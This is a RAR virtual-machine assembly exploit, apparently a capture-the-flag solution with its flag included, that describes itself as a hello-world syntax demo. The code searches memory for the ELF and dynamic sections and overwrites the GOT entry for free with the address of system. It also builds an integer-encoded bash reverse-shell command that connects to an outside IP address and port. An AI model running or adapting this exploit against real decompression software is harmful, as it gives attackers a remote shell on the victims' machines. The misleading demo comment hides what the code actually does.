#include <constants.rh>
#include <crctools.rh>
#include <math.rh>
#include <util.rh>


; Test RAR assembly file that just demonstrates the syntax.
;
; Usage:
;
;   $ unrar p -inul helloworld.rar
;   Hello, World!
;

_start:
    call $search_elf
    mov r6, r0
    call $search_dyn
    ; call $search_got
    ; add r0, r6 ; relative offset of GOT entries
    call $search_free
    mov r1, [r0]
    sub r1, #0x97950 ; free
    add r1, #0x4f440 ; system
    mov [r0], r1
    jmp $prepare_command
    jmp $ok
    jmp $dead

search_dyn:
    mov r1, r0 ; ELF header
    add r1, #64 ; phdr
_dyn_loop:
    mov r5, [r1+#0]
    cmp r5, #2 ; PT_DYNAMIC
    jz $_dyn_found
    add r1, #56 ; sizeof(phdr)
    jmp $_dyn_loop
_dyn_found:
    add r1, #16
    mov r2, [r1]
    add r0, r2
    ret

search_got:
    mov r1, r0 ; dynamic tags
_got_loop:
    mov r5, [r1]
    cmp r5, #3
    jz $_got_found
    add r1, #16 ; sizeof(tag)
    jmp $_got_loop
_got_found:
    add r1, #8
    mov r0, [r1]
    ret

search_free:
    mov r1, r0 ; dynamic tags
_free_loop:
    mov r5, [r1]
    and r5, #0xfff
    cmp r5, #0x950
    jz $_free_found
    add r1, #8
    jmp $_free_loop
_free_found:
    mov r0, r1
    ret
    ; search for ELF header
search_elf:
    mov     r3, #0x14fffff0
__loop:
    mov     r5, [r3+#0]
    cmp     r5, #0x464c457f
    jz      $__found
    add r3, #0x1000
    jmp $__loop
__found:
    mov r0, r3
    ret
dead:
    mov r4, #0x7fcc0000
    mov     [r4+#0], #0x6c6c6548        ; 'lleH'
prepare_command:
    mov r4, #0x0
    mov [r4+#0],#1752392034
    mov [r4+#4],#543370528
    mov [r4+#8],#1935761959
    mov [r4+#12],#1764565096
    mov [r4+#16],#539377184
    mov [r4+#20],#1986356271
    mov [r4+#24],#1885565999
    mov [r4+#28],#808726831
    mov [r4+#32],#842084654
    mov [r4+#36],#774976302
    mov [r4+#40],#791752753
    mov [r4+#44],#858796086
    mov [r4+#48],#1043341363
    mov [r4+#52],#2568486
    ; mov [r0+#0], #0x6873 ; sh
ok:
    call    $_success
; rwctf{5325209b60d04dabde70eb5a2d5e43df}
